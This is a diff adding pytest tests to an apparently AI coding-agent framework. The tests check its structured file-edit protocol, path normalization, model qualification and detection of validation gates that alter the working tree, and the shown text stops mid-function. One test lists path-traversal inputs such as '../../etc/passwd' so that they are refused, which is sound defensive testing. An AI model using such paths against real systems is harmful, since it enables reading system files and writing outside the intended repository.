@@ -314,15 +314,21 @@ def test_structured_malformed_protocol_is_refused_typed(response, code):
     assert parsed.kind == INVALID and parsed.reason_code == code
 
 
-def test_structured_protocol_is_operator_selected_and_security_authority():
-    from kriya.agents.response_protocol import developer_response_protocol
+def test_structured_protocol_is_the_default_and_the_selection_is_security_authority():
+    from kriya.agents.response_protocol import (
+        DEFAULT_RESPONSE_PROTOCOL,
+        developer_response_protocol,
+        response_protocol_identity,
+    )
     from kriya.config.authority import _SECURITY_AUTHORITY_FIELDS
 
-    assert AppConfig().autonomy.developer_response_protocol == "legacy_strict"
+    assert AppConfig().autonomy.developer_response_protocol == "structured" == DEFAULT_RESPONSE_PROTOCOL
+    assert response_protocol_identity(AppConfig()) == "kriya_sentinel_v1"
     assert ("autonomy", "developer_response_protocol") in _SECURITY_AUTHORITY_FIELDS
     cfg = AppConfig()
-    cfg.autonomy.developer_response_protocol = "structured"
-    assert developer_response_protocol(cfg) == "structured"
+    cfg.autonomy.developer_response_protocol = "legacy_strict"
+    assert developer_response_protocol(cfg) == "legacy_strict"
+    assert response_protocol_identity(cfg) == "strict_legacy_v1"
     with pytest.raises(ValueError):
         AppConfig(autonomy={"developer_response_protocol": "heuristic"})
 
@@ -808,7 +814,8 @@ def test_issue11_a_repository_pom_is_never_rewritten_behind_the_gates(tmp_path):
 
     engine, _llm = _engine(_config(), [
         "Step 1: add App", "Design: Write app/App.java",
-        '[{"filepath": "app/App.java", "content": "public class App { public static void main(String[] a) {} }\\n"}]',
+        '<<<KRIYA:FILE path="app/App.java">>>\npublic class App { public static void main(String[] a) {} }\n'
+        '<<<KRIYA:END_FILE>>>\n',
         "Review: Approved",
     ])
     with patch.object(PolymorphicValidator, "run_compile_check", compile_check), \
@@ -859,7 +866,8 @@ _WRITE_RE = re.compile(
 _AUDITED_WRITE_SITES = {
     "kriya/cli.py": 7, "kriya/config/authority_approval.py": 4, "kriya/control/persistence.py": 1,
     "kriya/control/recovery.py": 3, "kriya/control/retention.py": 1, "kriya/core/model_certification.py": 4,
-    "kriya/core/model_qualification.py": 2, "kriya/core/model_routing.py": 2, "kriya/core/model_runtime.py": 2,
+    "kriya/core/model_qualification.py": 3, "kriya/core/model_routing.py": 2, "kriya/core/model_runtime.py": 2,
+
     "kriya/core/state_paths.py": 2, "kriya/knowledge/staging.py": 4, "kriya/mcp/invocation_approval.py": 2,
     "kriya/memory/memory.py": 2, "kriya/metrics/adjudication.py": 2, "kriya/metrics/report.py": 2,
     "kriya/policy/approved_sources.py": 1, "kriya/production_doctor.py": 4, "kriya/skills/skill.py": 4,
@@ -923,3 +931,655 @@ def test_no_payload_sanitizer_or_substring_anchor_remains():
         assert gone not in identifiers, gone
     engine = (ROOT / "kriya/workflow/file_integrity.py").read_text()
     assert ".splitlines(" not in engine and ".count(search" not in engine
+
+
+# ================================================================ closure pass (F-1..F-4, S-1, S-2)
+
+_EDIT = '<<<KRIYA:EDIT path="app.properties">>>\n<<<KRIYA:SEARCH>>>\nserver.port=8080\n<<<KRIYA:REPLACE>>>\nserver.port=8081\n<<<KRIYA:END_EDIT>>>\n'
+_PROSE = "\nI updated the port so the service no longer clashes with the admin console.\n"
+
+
+def test_f1_legacy_framing_carries_trailing_prose_into_the_payload():
+    """The measured F-1 mechanism (kept as characterization): the legacy
+    markers have no terminator, so prose after REPLACE is payload. This is
+    why legacy is compatibility-only and never the production protocol."""
+    parsed = parse_legacy_repair("FIX ANALYSIS: port\nSEARCH:\nserver.port=8080\nREPLACE:\nserver.port=8081\n" + _PROSE,
+                                 "app.properties", patch_allowed=True)
+    assert parsed.kind == EDITS and "no longer clashes" in parsed.edits[0][1]
+
+
+@pytest.mark.parametrize("response", [
+    _EDIT + _PROSE,
+    '<<<KRIYA:FILE path="app.properties">>>\nserver.port=8081\n<<<KRIYA:END_FILE>>>\n' + _PROSE,
+    '<<<KRIYA:FILE path="cfg.yaml">>>\nport: 8081\n<<<KRIYA:END_FILE>>>\n' + "Note: also check the proxy.\n",
+    _EDIT + "<<<KRIYA:END_EDIT>>>\n",
+])
+def test_f1_text_after_the_last_structured_block_is_refused_and_never_written(response):
+    target = "cfg.yaml" if "cfg.yaml" in response else "app.properties"
+    parsed = parse_structured(response, target)
+    assert parsed.kind == INVALID and parsed.reason_code == INVALID_EDIT_PROTOCOL
+    assert parsed.content is None and parsed.edits == ()
+
+
+@pytest.mark.developer_answers_verbatim
+def test_f1_the_production_developer_refuses_trailing_prose_end_to_end():
+    import asyncio
+    from unittest.mock import AsyncMock
+
+    from kriya.core import LLMClient
+    from kriya.workflow.operations import CodeOperation
+
+    cfg = AppConfig()  # the production default protocol
+    llm = LLMClient(cfg)
+    llm.complete = AsyncMock(return_value=('Change the port.\n<<<KRIYA:FILE path="app.properties">>>\n'
+                                           'server.port=8081\n<<<KRIYA:END_FILE>>>\n' + _PROSE))
+    files = asyncio.run(DeveloperAgent("developer", llm).run_generation(
+        "Task", "Design", "server.port=8080\n", known_target_files=["app.properties"],
+        prior_error_context="port clash", files_with_current_content={"app.properties"},
+        operation_by_file={"app.properties": CodeOperation.REPAIR_WITH_PATCH}))
+    assert files[0]["protocol_reason_code"] == INVALID_EDIT_PROTOCOL
+    assert files[0]["content"] is None and not files[0].get("edits")
+    system = llm.complete.call_args.args[0]
+    assert '<<<KRIYA:FILE path="app.properties">>>' in system and "FILE CONTENT:" not in system
+
+
+def test_f2_structured_file_newline_grammar_is_explicit():
+    with_newline = parse_structured('<<<KRIYA:FILE path="a.py">>>\nx = 1\n<<<KRIYA:END_FILE>>>\n', "a.py")
+    assert with_newline.content == "x = 1\n" and with_newline.final_newline is True
+    without = parse_structured('<<<KRIYA:FILE path="a.py">>>\nx = 1\n<<<KRIYA:END_FILE no_final_newline>>>\n', "a.py")
+    assert without.content == "x = 1" and without.final_newline is False
+    empty = parse_structured('<<<KRIYA:FILE path="a.py">>>\n<<<KRIYA:END_FILE>>>\n', "a.py")
+    assert empty.content == ""
+    blank_tail = parse_structured('<<<KRIYA:FILE path="a.py">>>\nx\n\n<<<KRIYA:END_FILE>>>\n', "a.py")
+    assert blank_tail.content == "x\n\n"
+
+
+def test_f2_new_and_existing_file_final_newline_state(tmp_path):
+    new = load_snapshot(str(tmp_path / "new.py"))
+    parsed = parse_structured('<<<KRIYA:FILE path="new.py">>>\nx = 1\n<<<KRIYA:END_FILE no_final_newline>>>\n', "new.py")
+    assert new.encode(keep_final_newline_state(new, parsed.content)) == b"x = 1"
+    parsed = parse_structured('<<<KRIYA:FILE path="new.py">>>\nx = 1\n<<<KRIYA:END_FILE>>>\n', "new.py")
+    assert new.encode(keep_final_newline_state(new, parsed.content)) == b"x = 1\n"
+    # Existing File Convention Policy: the file's own state wins.
+    none = load_snapshot(str(_write(tmp_path, "none.py", b"old")))
+    assert none.encode(keep_final_newline_state(none, parsed.content)) == b"x = 1"
+    crlf = load_snapshot(str(_write(tmp_path, "crlf.py", b"a\r\nb\r\n")))
+    parsed = parse_structured('<<<KRIYA:FILE path="crlf.py">>>\na\nc\n<<<KRIYA:END_FILE>>>\n', "crlf.py")
+    assert crlf.encode(keep_final_newline_state(crlf, parsed.content)) == b"a\r\nc\r\n"
+    bom = load_snapshot(str(_write(tmp_path, "bom.py", b"\xef\xbb\xbfa\n")))
+    assert bom.encode(keep_final_newline_state(bom, "b\n")) == b"\xef\xbb\xbfb\n"
+
+
+@pytest.mark.parametrize(("path", "expected"), [
+    ("./a.py", "a.py"), ("src//pkg///a.py", "src/pkg/a.py"), ("src/./a.py", "src/a.py"),
+    ("src/x/../a.py", "src/a.py"), ("a.py", "a.py"),
+])
+def test_s2_protocol_paths_normalize_to_the_repository_relative_target(path, expected):
+    from kriya.agents.response_protocol import normalize_protocol_path
+
+    assert normalize_protocol_path(path) == expected
+    parsed = parse_structured(f'<<<KRIYA:FILE path="{path}">>>\nx\n<<<KRIYA:END_FILE>>>\n', expected)
+    assert parsed.kind == FILE and parsed.content == "x\n"
+
+
+@pytest.mark.parametrize("path", ["../../etc/passwd", "../a.py", "/etc/passwd", "a/../../b.py", "C:/x.py",
+                                  "a\\b.py", ".", "..", "a\x00b.py"])
+def test_s2_escaping_absolute_or_malformed_protocol_paths_are_refused(path):
+    from kriya.agents.response_protocol import normalize_protocol_path
+
+    assert normalize_protocol_path(path) is None
+    parsed = parse_structured(f'<<<KRIYA:FILE path="{path}">>>\nx\n<<<KRIYA:END_FILE>>>\n', "a.py")
+    assert parsed.kind == INVALID and parsed.reason_code == INVALID_EDIT_PROTOCOL
+
+
+def test_s2_a_normalized_path_naming_another_file_is_refused():
+    parsed = parse_structured('<<<KRIYA:FILE path="./b.py">>>\nx\n<<<KRIYA:END_FILE>>>\n', "a.py")
+    assert parsed.kind == INVALID and "expected 'a.py'" in parsed.detail
+
+
+@pytest.mark.parametrize(("target", "payload"), [
+    ("pkg/mod.py", '"""Usage:\n\n```python\nimport mod\n```\n"""\n\ndef run():\n    return 1\n'),
+    ("README.md", "# T\n\n```bash\nrun\n```\n\n```\nplain\n```\n"),
+    ("src/A.java", 'class A {\n    // ```java example\n    String s = "```";\n}\n'),
+])
+def test_structured_payload_carries_fence_like_content_verbatim(target, payload):
+    parsed = parse_structured(f'Why.\n<<<KRIYA:FILE path="{target}">>>\n{payload}<<<KRIYA:END_FILE>>>\n', target)
+    assert parsed.kind == FILE and parsed.content == payload
+
+
+def test_s1_search_edge_blank_lines_are_part_of_the_anchor_until_measured():
+    """S-1 is decided by measured evidence (handover); until then a blank
+    SEARCH edge line is an anchor line, and REPLACE edges are always exact."""
+    parsed = parse_structured('<<<KRIYA:EDIT path="a.py">>>\n<<<KRIYA:SEARCH>>>\n\nx = 1\n<<<KRIYA:REPLACE>>>\n\nx = 2\n\n'
+                              '<<<KRIYA:END_EDIT>>>\n', "a.py")
+    assert parsed.edits == (("\nx = 1", "\nx = 2\n"),)
+
+
+def test_no_automatic_fallback_between_protocols():
+    """One invocation, one protocol: a legacy answer under the structured
+    protocol is refused, never re-read as legacy (and vice versa)."""
+    legacy = "FIX ANALYSIS: x\nSEARCH:\na\nREPLACE:\nb\n"
+    assert parse_structured(legacy, "a.py").reason_code == MODEL_EDIT_PROTOCOL_INVALID
+    structured = '<<<KRIYA:EDIT path="a.py">>>\n<<<KRIYA:SEARCH>>>\na\n<<<KRIYA:REPLACE>>>\nb\n<<<KRIYA:END_EDIT>>>\n'
+    assert parse_legacy_repair(structured, "a.py", patch_allowed=True).kind == INVALID
+    agent_source = (ROOT / "kriya/agents/agent.py").read_text()
+    call = agent_source[agent_source.index("protocol = developer_response_protocol(self.llm.config)"):]
+    call = call[:call.index("analysis = parsed.analysis")]
+    assert call.count("parse_structured(") == 1 and "elif" in call  # exactly one parser per invocation
+
+
+def test_qualification_binds_the_response_protocol_and_v6_records_are_stale():
+    from kriya.core import model_qualification as mq
+
+    assert mq.QUALIFICATION_POLICY_VERSION == "kriya-qualification/7"
+    structured, legacy = AppConfig(), AppConfig()
+    legacy.autonomy.developer_response_protocol = "legacy_strict"
+    assert mq.policy_digest_for(structured) != mq.policy_digest_for(legacy)
+    record = mq.build_record(_qual_fp(), [mq.CaseResult("plain_completion", mq.PASS)], settings=_qual_settings(),
+                             response_protocol="kriya_sentinel_v1")
+    assert record["developer_response_protocol"] == "kriya_sentinel_v1"
+    ok = mq.assess(_qual_fp(), ("plain_completion",), settings=_qual_settings(), record=record,
+                   policy_digest=mq.policy_digest_for(structured))
+    other = mq.assess(_qual_fp(), ("plain_completion",), settings=_qual_settings(), record=record,
+                      policy_digest=mq.policy_digest_for(legacy))
+    assert ok.status == mq.QUALIFIED and other.status == mq.STALE
+    v6 = dict(record, policy_version="kriya-qualification/6")
+    assert mq.assess(_qual_fp(), ("plain_completion",), settings=_qual_settings(), record=v6,
+                     policy_digest=mq.policy_digest_for(structured)).status == mq.STALE
+
+
+def _qual_fp():
+    from test_prd014_model_qualification import _fp
+
+    return _fp()
+
+
+def _qual_settings():
+    from kriya.core.inference_settings import InferenceSettings
+
+    return InferenceSettings(temperature=0.7, reasoning=False)
+
+
+@pytest.mark.parametrize(("protocol", "status"), [("structured", "PASS"), ("legacy_strict", "FAIL")])
+def test_doctor_requires_the_structured_protocol(protocol, status):
+    from types import SimpleNamespace
+
+    from kriya.production_doctor import _check_response_protocol
+
+    cfg = AppConfig()
+    cfg.autonomy.developer_response_protocol = protocol
+    check = _check_response_protocol(SimpleNamespace(cfg=cfg))
+    assert check.status.value == status and check.required is True
+    assert check.evidence["identity"] == ("kriya_sentinel_v1" if protocol == "structured" else "strict_legacy_v1")
+
+
+def test_production_runs_refuse_the_legacy_protocol():
+    source = (ROOT / "kriya/cli.py").read_text()
+    guard = source[source.index('if cfg.runtime_profile == "production" and developer_response_protocol(cfg)'):]
+    assert "RESPONSE_PROTOCOL_NOT_PRODUCTION" in guard[:600] and "sys.exit(1)" in guard[:600]
+
+
+def _slug_block(payload, end="<<<KRIYA:END_FILE>>>"):
+    body = payload[:-1] if payload.endswith("\n") else payload
+    return f'<<<KRIYA:FILE path="slug.py">>>\n{body}\n{end}\n'
+
+
+_V7_SOURCE = __import__("kriya.core.model_qualification", fromlist=["FULL_FILE_SOURCE"]).FULL_FILE_SOURCE
+_EDIT_OK = ('Skip negatives.\n<<<KRIYA:EDIT path="./src/calc.py">>>\n<<<KRIYA:SEARCH>>>\n        result += p\n'
+            "<<<KRIYA:REPLACE>>>\n        if p >= 0:\n            result += p\n<<<KRIYA:END_EDIT>>>\n")
+
+
+@pytest.mark.parametrize(("case", "answer", "passes"), [
+    ("full", _slug_block(_V7_SOURCE), True),                                               # supplied file, exact
+    ("full", "Sure!\n" + _slug_block(_V7_SOURCE), True),                                  # prose BEFORE is grammar
+    ("full", _slug_block(_V7_SOURCE.replace("    ```python\n", "").replace("    ```\n", "")), False),  # fence dropped
+    ("full", _slug_block(_V7_SOURCE.replace("hello-world", "hello_world")), False),       # one byte changed
+    ("full", _slug_block(_V7_SOURCE) + "Hope this helps!\n", False),                     # trailing prose
+    ("full", _slug_block(_V7_SOURCE, "<<<KRIYA:END_FILE no_final_newline>>>"), False),     # wrong final newline
+    ("full", _V7_SOURCE, False),                                                          # protocol bypassed
+    ("edit", _EDIT_OK, True),
+    ("edit", _EDIT_OK.replace("./src/calc.py", "../src/calc.py"), False),                # path escape
+    ("edit", _EDIT_OK + "done\n", False),                                                # trailing prose
+])
+def test_v7_protocol_cases_judge_the_structured_protocol(case, answer, passes):
+    import asyncio
+
+    from kriya.core import model_qualification as mq
+    from kriya.core.completion import CompletionResult, CompletionStatus
+
+    class OneAnswer:
+        def __init__(self):
+            self.calls = []
+
+        async def complete_result(self, system, prompt, **kwargs):
+            self.calls.append((system, prompt))
+            return CompletionResult(content=answer, status=CompletionStatus.OK, finish_reason="stop")
+
+    llm = OneAnswer()
+    fn = mq.case_full_file_raw_content if case == "full" else mq.case_anchored_edit_protocol
+    result = asyncio.run(fn(llm, "m", {"response_protocol": "structured"}))
+    assert (result.status == mq.PASS) is passes, result.evidence
+    assert "<<<KRIYA:" in llm.calls[0][0]
+
+
+@pytest.mark.developer_answers_verbatim
+def test_no_fallback_a_legacy_shaped_answer_under_the_structured_protocol_is_refused():
+    import asyncio
+    from unittest.mock import AsyncMock
+
+    from kriya.core import LLMClient
+    from kriya.workflow.operations import CodeOperation
+
+    llm = LLMClient(AppConfig())
+    llm.complete = AsyncMock(return_value="FIX ANALYSIS: port\nFILE CONTENT:\nserver.port=8081\n")
+    files = asyncio.run(DeveloperAgent("developer", llm).run_generation(
+        "Task", "Design", "server.port=8080\n", known_target_files=["app.properties"],
+        prior_error_context="port clash", files_with_current_content={"app.properties"},
+        operation_by_file={"app.properties": CodeOperation.REPAIR_WITH_FULL_FILE}))
+    assert files[0]["protocol_reason_code"] == MODEL_EDIT_PROTOCOL_INVALID and files[0]["content"] is None
+
+
+# ---------------------------------------------------------------- F-3: typed sync stop in both modes
+
+
+def _sync_workspace(tmp_path):
+    ws = tmp_path / "ws"
+    ws.mkdir()
+    for args in (["init", "-q"], ["config", "user.email", "t@x"], ["config", "user.name", "t"]):
+        _git(ws, *args)
+    (ws / "a.txt").write_text("v1\n")
+    _git(ws, "add", "-A")
+    _git(ws, "commit", "-qm", "s")
+    (ws / "a.txt").write_text("v2 uncommitted\n")
+    return ws
+
+
+def _sync_sabotage(kind):
+    import shutil as real_shutil
+
+    real_copy2 = real_shutil.copy2
+
+    def sabotage(src, dst, follow_symlinks=True):
+        if kind == "copy_fails":
+            raise OSError("disk full")
+        real_copy2(src, dst, follow_symlinks=follow_symlinks)
+        if kind == "source_changed_during_sync":
+            Path(src).write_text("v3 written during the sync\n")
+        else:  # byte mismatch after sync
+            Path(dst).write_bytes(b"stale\n")
+    return sabotage
+
+
+@pytest.mark.parametrize(("kind", "code"), [
+    ("copy_fails", WORKTREE_SYNC_FAILED),
+    ("source_changed_during_sync", WORKTREE_CONTENT_MISMATCH),
+    ("byte_mismatch", WORKTREE_CONTENT_MISMATCH),
+])
+def test_f3_direct_mode_returns_the_typed_sync_stop(tmp_path, kind, code):
+    import asyncio
+
+    from _milestone_proof_harness import _config, _engine
+
+    from kriya.workflow import worktree as worktree_module
+
+    ws = _sync_workspace(tmp_path)
+    engine, llm = _engine(_config(), ["Step 1: x", "Design: x", "Review: Approved"])
+    with patch.object(worktree_module.shutil, "copy2", side_effect=_sync_sabotage(kind)):
+        result = asyncio.run(engine.run_generation_workflow("Change a.txt", str(ws)))
+    assert result["quality_gates_passed"] is False
+    assert result["reason_codes"] == [code] and result["failure_category"] == code.lower()
+    assert result["error"].startswith(f"{code}:")
+    assert llm.complete.await_count <= 2  # stopped before any Developer call
+
+
+@pytest.mark.parametrize("code", [WORKTREE_SYNC_FAILED, WORKTREE_CONTENT_MISMATCH])
+def test_f3_enforce_mode_reports_the_typed_sync_stop(tmp_path, monkeypatch, code):
+    import asyncio
+
+    from test_workflow_controller_enforce import _patched, _workflow_engine
+
+    from kriya.workflow.plan_schema import EngineeringPlan, ExecutionMethod, FileAction, PlannedFile, Subtask
+    from kriya.workflow.triage import ChangeKind
+    from kriya.workflow.workflow_controller import WorkflowController
+    from kriya.workflow.worktree import WorktreeSyncError
+
+    def refuse(workspace):
+        raise WorktreeSyncError(code, "the sandbox does not hold the workspace's bytes")
+
+    monkeypatch.setattr("kriya.workflow.workflow_controller.create_git_worktree", refuse)
+    plan = EngineeringPlan(plan_id="run1", kind=ChangeKind.TASK, subtasks=[Subtask(
+        id="s1", description="edit a", execution_method=ExecutionMethod.MODEL,
+        planned_files=[PlannedFile(path="a.txt", action=FileAction.MODIFY)])])
+    (tmp_path / "a.txt").write_text("v1\n")
+    we = _workflow_engine()
+    p1, p2, p3 = _patched(plan)
+    with p1, p2, p3:
+        result = asyncio.run(WorkflowController(we).execute("edit a", str(tmp_path), migration_mode="enforce"))
+    legacy = result.legacy_result
+    assert legacy["reason_codes"] == [code] and legacy["failure_type"] == "WORKTREE_SYNC"
+    assert legacy["quality_gates_passed"] is False and "STRUCTURED_PLAN_UNAVAILABLE" not in legacy["reason_codes"]
+
+
+# ---------------------------------------------------------------- F-4: verification tree binding
+
+
+def _tree(tmp_path):
+    root = tmp_path / "repo"
+    root.mkdir()
+    for args in (["init", "-q"], ["config", "user.email", "t@x"], ["config", "user.name", "t"]):
+        _git(root, *args)
+    (root / "src").mkdir()
+    (root / "src" / "App.java").write_text("class App {}\n")
+    (root / "README.md").write_text("readme\n")
+    (root / ".gitignore").write_text("target/\n")
+    _git(root, "add", "-A")
+    _git(root, "commit", "-qm", "s")
+    (root / "src" / "New.java").write_text("class New {}\n")  # the candidate (untracked)
+    return root
+
+
+def _binding(root):
+    from kriya.workflow.file_integrity import VerificationTreeBinding
+    from kriya.workflow.worktree import repository_content_paths
+
+    return VerificationTreeBinding(str(root), repository_content_paths(str(root)), ["src/New.java"])
+
+
+@pytest.mark.parametrize(("mutate", "path"), [
+    (lambda r: (r / "src" / "New.java").write_text("class New { int x; }\n"), "src/New.java"),  # candidate
+    (lambda r: (r / "README.md").write_text("rewritten by a formatter\n"), "README.md"),        # unrelated tracked
+    (lambda r: (r / "src" / "App.java").unlink(), "src/App.java"),                             # deleted tracked
+    (lambda r: os.chmod(r / "README.md", 0o755), "README.md"),                                  # mode change
+])
+def test_f4_a_gate_changing_candidate_or_tracked_content_is_caught(tmp_path, mutate, path):
+    from kriya.workflow.file_integrity import VERIFICATION_GATE_MUTATED_TRACKED_FILES, VerificationTreeMutated
+
+    root = _tree(tmp_path)
+    binding = _binding(root)
+    binding.check("compile")
+    mutate(root)
+    with pytest.raises(VerificationTreeMutated) as raised:
+        binding.check("tests")
+    failure = raised.value.failure
+    assert failure.type == "verification_tree_mutated"
+    assert failure.diagnostics["reason_code"] == VERIFICATION_GATE_MUTATED_TRACKED_FILES
+    assert failure.diagnostics["gate"] == "tests" and failure.diagnostics["changed_paths"] == [path]
+    assert "Kriya cannot verify one tree and commit another" in failure.message
+
+
+def test_f4_untracked_build_output_touches_and_authorized_writes_are_not_mutations(tmp_path):
+    root = _tree(tmp_path)
+    binding = _binding(root)
+    (root / "target" / "classes").mkdir(parents=True)
+    (root / "target" / "classes" / "App.class").write_bytes(b"\xca\xfe")        # ignored build output
+    (root / "build.log").write_text("untracked, not ignored\n")                  # untracked output
+    os.utime(root / "README.md", ns=(1, 1))                                      # touch, same bytes
+    (root / "README.md").write_text("readme\n")
+    binding.check("compile")
+    (root / "src" / "New.java").write_text("class New { int patched; }\n")      # Kriya's own write...
+    binding.authorize("src/New.java")                                            # ...re-recorded
+    binding.check("tests")
+
+
+@pytest.mark.parametrize(("marker", "call", "gate"), [
+    ("requirements.txt", lambda v: v.run_tests(), "tests"),
+    ("requirements.txt", lambda v: v.run_app(["python3", "-c", "print(1)"]), "runtime_verification"),
+    ("pom.xml", lambda v: v.run_compile_check(["src/App.java"]), "compile"),
+    ("pom.xml", lambda v: v.run_tests(), "tests"),
+])
+def test_f4_every_validator_gate_checks_the_tree_after_its_command(tmp_path, marker, call, gate):
+    from kriya.tools.validate import PolymorphicValidator
+    from kriya.workflow.file_integrity import VerificationTreeMutated
+
+    root = _tree(tmp_path)
+    (root / marker).write_text("<project/>\n" if marker == "pom.xml" else "")
+    validator = PolymorphicValidator(str(root))
+    validator.tree_binding = _binding(root)
+
+    def mutating_command(self, cmd, cwd, **kwargs):
+        (root / "README.md").write_text("formatted during the gate\n")
+        return {"returncode": 0, "stdout": "ok", "stderr": "", "timeout": False}
+
+    with patch.object(PolymorphicValidator, "_run_cmd_with_timeout", mutating_command), \
+            patch.object(PolymorphicValidator, "_ensure_project_venv", lambda self: None, create=True):
+        with pytest.raises(VerificationTreeMutated) as raised:
+            call(validator)
+    assert raised.value.gate == gate
+
+
+def test_f4_without_a_mutation_the_gate_result_is_returned(tmp_path):
+    from kriya.tools.validate import PolymorphicValidator
+
+    root = _tree(tmp_path)
+    validator = PolymorphicValidator(str(root))
+    validator.tree_binding = _binding(root)
+    with patch.object(PolymorphicValidator, "_run_cmd_with_timeout",
+                      lambda self, cmd, cwd, **k: {"returncode": 0, "stdout": "1", "stderr": "", "timeout": False}):
+        assert validator.run_app(["python3", "-c", "print(1)"])["returncode"] == 0
+
+
+def test_f4_a_gate_that_mutates_and_then_raises_reports_the_mutation(tmp_path):
+    """The exception path is checked too: a gate that changes tracked
+    content and then fails never hides the change behind its own error."""
+    from kriya.tools.validate import PolymorphicValidator
+    from kriya.workflow.file_integrity import VerificationTreeMutated
+
+    root = _tree(tmp_path)
+    (root / "requirements.txt").write_text("")
+    validator = PolymorphicValidator(str(root))
+    validator.tree_binding = _binding(root)
+
+    def mutate_then_fail(self, *args, **kwargs):
+        (root / "README.md").write_text("changed before the crash\n")
+        raise RuntimeError("toolchain crashed")
+
+    gate = _verification_gate_named("run_tests", mutate_then_fail)
+    with pytest.raises(VerificationTreeMutated) as raised:
+        gate(validator)
+    assert raised.value.gate == "tests" and isinstance(raised.value.__context__, RuntimeError)
+
+
+@pytest.mark.parametrize("gate_method", ["run_compile_check", "run_tests"])
+def test_f4_a_mutating_gate_stops_the_real_run_and_nothing_is_committed(tmp_path, gate_method):
+    """Real WorkflowEngine (mocked model): the Java compile or test gate
+    rewrites a tracked file; the run stops typed at that gate and the
+    workspace is left exactly as it was."""
+    import asyncio
+
+    from _milestone_proof_harness import _config, _engine
+
+    from kriya.tools.validate import PolymorphicValidator
+
+    ws = tmp_path / "ws"
+    ws.mkdir()
+    for args in (["init", "-q"], ["config", "user.email", "t@x"], ["config", "user.name", "t"]):
+        _git(ws, *args)
+    (ws / "README.md").write_text("readme\n")
+    (ws / "calc.py").write_text("def add(a, b):\n    return a + b\n")
+    _git(ws, "add", "-A")
+    _git(ws, "commit", "-qm", "s")
+    engine, _ = _engine(_config(), [
+        "Step 1: add sub", "Design: Write calc.py",
+        '<<<KRIYA:FILE path="calc.py">>>\ndef add(a, b):\n    return a + b\n\n\ndef sub(a, b):\n    return a - b\n'
+        "<<<KRIYA:END_FILE>>>\n",
+        "Review: Approved",
+    ])
+    (ws / "test_calc.py").write_text("from calc import add\n\n\ndef test_add():\n    assert add(1, 2) == 3\n")
+    _git(ws, "add", "-A")
+    _git(ws, "commit", "-qm", "tests")
+    later_gates = []
+
+    def formatter_bound_gate(self, *args, **kwargs):
+        (Path(self.workspace_path) / "README.md").write_text("reformatted by the build\n")
+        return {"success": True, "output": "ok"}
+
+    def other_gate(self, *args, **kwargs):
+        later_gates.append(gate_method)
+        return {"success": True, "output": "ok"}
+
+    with patch.object(PolymorphicValidator, gate_method, _verification_gate_named(gate_method, formatter_bound_gate)), \
+            patch.object(PolymorphicValidator, "run_tests" if gate_method != "run_tests" else "run_compile_check",
+                         other_gate):
+        result = asyncio.run(engine.run_generation_workflow("Add sub to calc.py", str(ws)))
+    assert result["quality_gates_passed"] is False
+    assert result.get("failure_category") == "verification_tree_mutated"
+    # Caught AT the gate that mutated the tree (not later by the terminal
+    # re-check), and no later gate ran on the mutated tree.
+    import json as _json
+    import sqlite3
+
+    from kriya.core.state_paths import trace_db_path
+
+    with sqlite3.connect(trace_db_path(engine.kernel.config)) as db:
+        (outcomes,) = db.execute("SELECT gate_outcomes FROM runs ORDER BY timestamp DESC LIMIT 1").fetchone()
+    stops = [o for o in _json.loads(outcomes) if o["type"] == "verification_tree_mutated"]
+    gate_name = {"run_compile_check": "compile", "run_tests": "tests"}[gate_method]
+    assert stops and f"the {gate_name} gate modified" in stops[0]["output"]
+    if gate_method == "run_compile_check":
+        assert later_gates == []
+    assert (ws / "README.md").read_text() == "readme\n"
+    assert "def sub" not in (ws / "calc.py").read_text()
+
+
+def _verification_gate_named(method_name, fn):
+    from kriya.tools.validate import _verification_gate
+
+    return _verification_gate({"run_compile_check": "compile", "run_tests": "tests"}[method_name])(fn)
+
+
+def test_f4_the_terminal_binding_rechecks_the_tree_even_after_an_undeclared_gate(tmp_path):
+    """A code path that runs repository code without being a declared
+    validator gate (simulated by an undecorated run_tests) still cannot slip
+    a tracked-content change past the terminal verified-candidate binding."""
+    import asyncio
+
+    from _milestone_proof_harness import _config, _engine
+
+    from kriya.tools.validate import PolymorphicValidator
+
+    ws = tmp_path / "ws"
+    ws.mkdir()
+    for args in (["init", "-q"], ["config", "user.email", "t@x"], ["config", "user.name", "t"]):
+        _git(ws, *args)
+    (ws / "README.md").write_text("readme\n")
+    (ws / "calc.py").write_text("def add(a, b):\n    return a + b\n")
+    _git(ws, "add", "-A")
+    _git(ws, "commit", "-qm", "s")
+    engine, _ = _engine(_config(), [
+        "Step 1", "Design: Write calc.py",
+        '<<<KRIYA:FILE path="calc.py">>>\ndef add(a, b):\n    return a + b\n\n\ndef sub(a, b):\n    return a - b\n'
+        "<<<KRIYA:END_FILE>>>\n",
+        "Review: Approved",
+    ])
+
+    calls = []
+
+    def undeclared_mutating_compile(self, *args, **kwargs):
+        calls.append("compile")
+        (Path(self.workspace_path) / "README.md").write_text("changed by an undeclared step\n")
+        return {"success": True, "output": "ok"}
+
+    with patch.object(PolymorphicValidator, "run_compile_check", undeclared_mutating_compile), \
+            patch.object(PolymorphicValidator, "run_tests", lambda self, *a, **k: {"success": True, "output": "ok"}):
+        result = asyncio.run(engine.run_generation_workflow("Add sub to calc.py", str(ws)))
+    assert result["quality_gates_passed"] is False
+    assert calls  # the undeclared step really ran
+    assert result.get("failure_category") == "verification_tree_mutated"
+    assert (ws / "README.md").read_text() == "readme\n"
+
+
+
+def test_f4_a_candidate_changed_between_gates_is_caught_before_the_next_gate_runs(tmp_path, monkeypatch):
+    """PRD-032 D10/E02's tamper point, before F-4: the candidate is changed
+    after static analysis but before the terminal full regression. The
+    verification-tree binding refuses it BEFORE that regression runs
+    (phase "before", not attributed to the gate), so no gate ever executes
+    repository code on the tampered tree and nothing is committed."""
+    import asyncio
+    import json as _json
+    import sqlite3
+
+    from _milestone_proof_harness import _config, _engine
+
+    from kriya.core.state_paths import trace_db_path
+    from kriya.tools.validate import PolymorphicValidator
+    from kriya.workflow import workflow as workflow_module
+
+    ws = tmp_path / "ws"
+    ws.mkdir()
+    for args in (["init", "-q"], ["config", "user.email", "t@x"], ["config", "user.name", "t"]):
+        _git(ws, *args)
+    (ws / "calc.py").write_text("def add(a, b):\n    return a + b\n")
+    _git(ws, "add", "-A")
+    _git(ws, "commit", "-qm", "s")
+    engine, _ = _engine(_config(), [
+        "Step 1", "Design: Write calc.py",
+        '<<<KRIYA:FILE path="calc.py">>>\ndef add(a, b):\n    return a + b\n\n\ndef sub(a, b):\n    return a - b\n'
+        "<<<KRIYA:END_FILE>>>\n",
+        "Review: Approved",
+    ])
+    tampered = {"done": False}
+    real_gate = workflow_module._run_static_analysis_gate
+
